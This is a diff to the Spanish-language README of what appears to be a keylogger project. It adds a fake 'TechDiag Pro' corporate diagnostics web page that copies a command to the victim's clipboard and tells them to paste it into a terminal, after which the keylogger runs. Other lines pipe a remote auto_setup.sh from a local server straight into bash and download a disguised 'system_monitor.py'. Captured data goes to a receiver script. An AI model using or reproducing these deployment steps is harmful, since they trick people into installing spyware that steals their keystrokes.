@@ -68,19 +68,35 @@ pip3 install -r requirements.txt
 python3 data_receiver.py --port 8080 --output received_data
 ```
 
-### 2. Servir Archivos para la Víctima
+### 2. Servir Archivos con Interfaz Web
 
 ```bash
 # En el directorio del proyecto (puerto 8000)
 python3 -m http.server 8000
 
-# El servidor estará disponible en:
+# La interfaz web estará disponible en:
 # http://TU_IP:8000
+# 
+# Características de la interfaz:
+# ✅ Diseño profesional "TechDiag Pro"
+# ✅ Dos opciones: Diagnóstico Completo/Rápido
+# ✅ Instrucciones automáticas para la víctima
+# ✅ Copia automática de comandos al portapapeles
 ```
 
 ### 3. Ejecutar en Máquina Víctima
 
-#### Opción A: Instalación Automática (Recomendada)
+#### 🌐 Opción A: Interfaz Web (Más Profesional)
+```bash
+# 1. Abrir navegador en máquina víctima
+# 2. Ir a: http://10.0.2.15:8000
+# 3. Ver interfaz "TechDiag Pro - Sistema de Diagnóstico Empresarial"
+# 4. Hacer clic en "Iniciar Diagnóstico Completo"
+# 5. Copiar comando mostrado y pegarlo en terminal
+# 6. El keylogger se ejecutará automáticamente
+```
+
+#### 💻 Opción B: Instalación Automática (Backup)
 ```bash
 # Desde la máquina víctima
 curl -s http://10.0.2.15:8000/auto_setup.sh | bash
@@ -89,7 +105,7 @@ curl -s http://10.0.2.15:8000/auto_setup.sh | bash
 wget -q -O - http://10.0.2.15:8000/auto_setup.sh | bash
 ```
 
-#### Opción B: Instalación Manual
+#### 🔧 Opción C: Instalación Manual
 ```bash
 # Descargar archivos
 wget http://10.0.2.15:8000/system_monitor.py
